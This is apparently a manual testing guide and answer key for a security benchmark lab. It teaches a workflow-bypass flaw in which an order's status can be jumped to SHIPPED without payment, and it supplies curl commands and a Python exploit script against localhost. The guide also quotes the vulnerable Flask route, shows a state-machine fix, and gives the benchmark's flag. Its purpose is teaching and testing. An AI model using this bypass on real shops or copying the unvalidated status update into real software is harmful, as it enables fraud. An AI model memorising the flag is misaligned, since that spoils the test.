# S7BEN-EASY-004: Manual Testing Guide

## Vulnerability: Workflow Bypass - Order Status Manipulation

### Overview
This benchmark demonstrates a business logic flaw where order status can be directly manipulated, allowing attackers to bypass critical workflow steps like payment verification.

---

## Setup

### 1. Build and Start the Benchmark
```bash
cd benchmarks/S7BEN-EASY-004
make build
make up
```

### 2. Verify Service is Running
```bash
make test
# Should output: Health check passed
```

### 3. Access the Application
Open your browser to: http://localhost:5000

---

## Understanding the Workflow

### Intended Workflow:
```
CREATED → PAYMENT_PENDING → PAID → SHIPPED → DELIVERED
```

Each state should only transition to the next valid state:
- **CREATED**: Customer creates an order
- **PAYMENT_PENDING**: Order awaits payment
- **PAID**: Payment processed successfully
- **SHIPPED**: Order dispatched (should require PAID)
- **DELIVERED**: Customer received order

### The Vulnerability:
The application doesn't enforce these transitions! You can jump directly from CREATED to SHIPPED without payment.

---

## Manual Testing Steps

### Step 1: Create an Order
```bash

```

**Expected Output:**
```json
{
  "item": "Premium Widget",
  "message": "Order created successfully",
  "order_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "price": 99.99,
  "status": "CREATED"
}
```

Save the `order_id` for next steps!

### Step 2: Check Order Status
```bash
ORDER_ID="a1b2c3d4-e5f6-7890-abcd-ef1234567890"  # Use your actual order_id

curl http://localhost:5000/order/$ORDER_ID
```

**Expected Output:**
```json
{
  "created_at": "2026-01-07T12:00:00",
  "item": "Premium Widget",
  "order_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "paid": false,
  "price": 99.99,
  "status": "CREATED",
  "updated_at": "2026-01-07T12:00:00"
}
```

Notice: `paid: false` and `status: CREATED`

### Step 3: Try Following Proper Workflow (Should Fail)
```bash
# Try to ship without payment
curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "PAYMENT_PENDING"}'
```

This works, but let's try the proper payment flow first to understand the intended behavior.

### Step 4: Process Payment (The Proper Way)
```bash
# First set to PAYMENT_PENDING
curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "PAYMENT_PENDING"}'

# Then process payment
curl -X POST http://localhost:5000/order/$ORDER_ID/payment
```

This would mark the order as PAID properly, but we're going to exploit the vulnerability instead!

---

## Exploitation

### Method 1: Direct Status Jump (Simple)

```bash
# Step 1: Create an order
ORDER_ID=$(curl -s -X POST http://localhost:5000/order \
  -H "Content-Type: application/json" \
  -d '{"item": "Premium Widget", "price": 99.99}' | \
  grep -o '"order_id":"[^"]*"' | cut -d'"' -f4)

echo "Created order: $ORDER_ID"

# Step 2: Jump directly to SHIPPED without payment!
curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "SHIPPED"}'
```

**Expected Output:**
```json
{
  "exploit_success": true,
  "flag": "S7BEN{W0RKFL0W_BYP4SS_SUCC3SSFUL}",
  "message": "Order status updated to SHIPPED - WORKFLOW BYPASS DETECTED! You successfully shipped an order without payment!",
  "new_status": "SHIPPED",
  "order_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "paid": false,
  "previous_status": "CREATED"
}
```

### Method 2: Using Python Script

Create `exploit.py`:
```python
import requests
import json

URL = "http://localhost:5000"

def exploit_workflow():
    """Exploit workflow bypass vulnerability"""
    print("[*] Creating new order...")

    # Step 1: Create order
    order_response = requests.post(
        f"{URL}/order",
        json={
            "item": "Premium Widget",
            "price": 99.99
        }
    )

    if order_response.status_code != 200:
        print(f"[-] Failed to create order: {order_response.status_code}")
        return

    order_data = order_response.json()
    order_id = order_data['order_id']

    print(f"[+] Order created: {order_id}")
    print(f"    Status: {order_data['status']}")
    print(f"    Item: {order_data['item']}")
    print(f"    Price: ${order_data['price']}")

    # Step 2: Check initial order status
    print(f"\n[*] Checking order status...")
    status_response = requests.get(f"{URL}/order/{order_id}")
    status_data = status_response.json()

    print(f"    Current status: {status_data['status']}")
    print(f"    Paid: {status_data['paid']}")

    # Step 3: Exploit - Jump directly to SHIPPED!
    print(f"\n[*] Exploiting workflow bypass...")
    print(f"    Skipping PAYMENT_PENDING and PAID states...")
    print(f"    Setting status directly to SHIPPED...")

    exploit_response = requests.put(
        f"{URL}/order/{order_id}/status",
        json={"status": "SHIPPED"}
    )

    if exploit_response.status_code != 200:
        print(f"[-] Exploitation failed: {exploit_response.status_code}")
        return

    result = exploit_response.json()

    print(f"\n[+] Exploitation successful!")
    print(f"    Previous status: {result['previous_status']}")
    print(f"    New status: {result['new_status']}")
    print(f"    Paid: {result['paid']}")

    if 'flag' in result:
        print(f"\n{'='*60}")
        print(f"FLAG: {result['flag']}")
        print(f"{'='*60}")
        print(f"\n{result['message']}")
        return True
    else:
        print(f"\n[-] No flag received - exploitation may have failed")
        return False

if __name__ == "__main__":
    print("="*60)
    print("S7BEN-EASY-004: Workflow Bypass Exploit")
    print("="*60)
    exploit_workflow()
```

Run the exploit:
```bash
python3 exploit.py
```

**Expected Output:**
```
============================================================
S7BEN-EASY-004: Workflow Bypass Exploit
============================================================
[*] Creating new order...
[+] Order created: a1b2c3d4-e5f6-7890-abcd-ef1234567890
    Status: CREATED
    Item: Premium Widget
    Price: $99.99

[*] Checking order status...
    Current status: CREATED
    Paid: False

[*] Exploiting workflow bypass...
    Skipping PAYMENT_PENDING and PAID states...
    Setting status directly to SHIPPED...

[+] Exploitation successful!
    Previous status: CREATED
    New status: SHIPPED
    Paid: False

============================================================
FLAG: S7BEN{W0RKFL0W_BYP4SS_SUCC3SSFUL}
============================================================

Order status updated to SHIPPED - WORKFLOW BYPASS DETECTED! You successfully shipped an order without payment!
```

### Method 3: Using Browser

1. Open http://localhost:5000
2. Click "Create Order" button
3. Note the order_id in the response
4. Click "Update Status" button
5. Enter: `SHIPPED`
6. The flag will appear in the response JSON

---

## Understanding the Vulnerability

### The Vulnerable Code (app.py:138-165)

```python
@app.route('/order/<order_id>/status', methods=['PUT'])
def update_order_status(order_id):
    """
    VULNERABILITY: Update order status without proper workflow validation!
    """
    new_status = data['status'].upper()

    # VULNERABILITY: No validation of workflow!
    # Should check:
    # 1. If current state allows transition to new state
    # 2. If payment was completed before shipping
    # 3. If all prerequisite steps were performed

    # Just update the status directly
    conn.execute(
        'UPDATE orders SET status = ?, updated_at = ? WHERE id = ?',
        (new_status, now, order_id)
    )

    # FLAG: If order reached SHIPPED without being PAID
    if new_status == 'SHIPPED' and not updated_order['paid']:
        flag = os.environ.get('FLAG', 'S7BEN{TEST_FLAG}')
```

### What's Missing?

**Proper workflow validation:**
```python
# Should validate state transitions
ALLOWED_TRANSITIONS = {
    'CREATED': ['PAYMENT_PENDING'],
    'PAYMENT_PENDING': ['PAID'],
    'PAID': ['SHIPPED'],
    'SHIPPED': ['DELIVERED']
}

current_status = order['status']
if new_status not in ALLOWED_TRANSITIONS.get(current_status, []):
    return jsonify({
        "error": "Invalid state transition",
        "current": current_status,
        "requested": new_status,
        "allowed": ALLOWED_TRANSITIONS.get(current_status, [])
    }), 400

# Should check payment before shipping
if new_status == 'SHIPPED' and not order['paid']:
    return jsonify({
        "error": "Cannot ship unpaid order"
    }), 400
```

---

## Real-World Impact

This type of vulnerability allows attackers to:
- Receive goods without payment
- Bypass approval workflows
- Skip security checks
- Manipulate business processes
- Access unauthorized features

### Similar Vulnerabilities:
- Uber's ride status manipulation (2014)
- E-commerce platforms allowing order manipulation
- Banking apps with transaction workflow bypasses
- SaaS platforms with subscription state manipulation

---

## Proper Fix

### Implement State Machine Validation:

```python
class OrderStateMachine:
    TRANSITIONS = {
        'CREATED': ['PAYMENT_PENDING'],
        'PAYMENT_PENDING': ['PAID'],
        'PAID': ['SHIPPED'],
        'SHIPPED': ['DELIVERED']
    }

    @staticmethod
    def can_transition(from_state, to_state):
        """Check if transition is valid"""
        return to_state in OrderStateMachine.TRANSITIONS.get(from_state, [])

    @staticmethod
    def validate_preconditions(order, new_state):
        """Check preconditions for state"""
        if new_state == 'SHIPPED':
            if not order['paid']:
                raise ValueError("Cannot ship unpaid order")

        if new_state == 'PAID':
            if order['status'] != 'PAYMENT_PENDING':
                raise ValueError("Order must be in PAYMENT_PENDING state")

        return True
```

---

## Testing Different Scenarios

### Scenario 1: Try Multiple Invalid Transitions
```bash
# Create order
ORDER_ID=$(curl -s -X POST http://localhost:5000/order \
  -H "Content-Type: application/json" \
  -d '{"item": "Test", "price": 10}' | \
  jq -r '.order_id')

# Try jumping to DELIVERED (even worse!)
curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "DELIVERED"}'

# Still works - but flag only appears on SHIPPED
```

### Scenario 2: Verify Proper Flow Doesn't Give Flag
```bash
# Create order
ORDER_ID=$(curl -s -X POST http://localhost:5000/order \
  -H "Content-Type: application/json" \
  -d '{"item": "Test", "price": 10}' | \
  jq -r '.order_id')

# Follow proper workflow
curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "PAYMENT_PENDING"}'

curl -X POST http://localhost:5000/order/$ORDER_ID/payment

curl -X PUT http://localhost:5000/order/$ORDER_ID/status \
  -H "Content-Type: application/json" \
  -d '{"status": "SHIPPED"}'

# No flag - because order was properly paid!
```

---

## Troubleshooting

### Issue: Can't create order
**Solution:** Check if service is running and healthy:
```bash
docker compose ps
docker compose logs app
```

### Issue: Flag not appearing
**Solution:** Make sure:
1. Order status is being set to `SHIPPED` (not DELIVERED)
2. Order was never marked as `paid: true`
3. You're checking the response JSON for the `flag` field

### Issue: Order ID not found
**Solution:** Make sure you're using the correct order_id from the creation response.

---

## Cleanup

```bash
make down
make clean
```

---

## Success Criteria

- Successfully created an order in CREATED state
- Bypassed PAYMENT_PENDING and PAID states
- Set status directly to SHIPPED
- Order remains unpaid (`paid: false`)
- Retrieved flag: `S7BEN{W0RKFL0W_BYP4SS_SUCC3SSFUL}`
